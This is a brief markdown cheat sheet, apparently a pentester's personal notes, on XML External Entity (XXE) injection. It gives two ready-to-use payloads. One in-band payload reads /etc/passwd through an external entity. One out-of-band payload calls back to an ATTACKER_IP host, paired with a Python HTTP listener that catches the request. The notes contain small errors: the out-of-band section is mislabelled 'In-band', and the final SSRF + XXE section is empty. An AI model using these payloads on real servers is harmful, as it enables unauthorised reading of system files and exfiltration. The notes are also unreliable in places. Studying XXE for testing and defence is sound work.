## XXE Injection - (XML External Entity) injection
security flaw that exploits vulnerabilities in an application's XML input


### XML
XML -  **Extensible Markup Language**  is typically used by applications to store and transport data and is a markup language derived from SGML **Standard Generalized Markup Language**, which is the same standard that HTML is based on


### XXE IN BAND
In-band refers to an vulnerability where the attacker **CAN** see the response from the server.

Example(using burp sutie):
*Works for text inputs*
```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>hacker@hacker.com</email>
<message>hacked</message>
</contact>
```
If the server is vulnerable it executes the **xxe** entity 

## XXE OUT OF BAND
In-band refers to an vulnerability where the attacker **CAN'T** see the response from the server.

Example(using burp sutie):
*Works for file uploads*
```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

If the server is vulnerable it executes the **xxe** entity and sends the data to the server. ``python -m http.server``


## SSRF + XXE

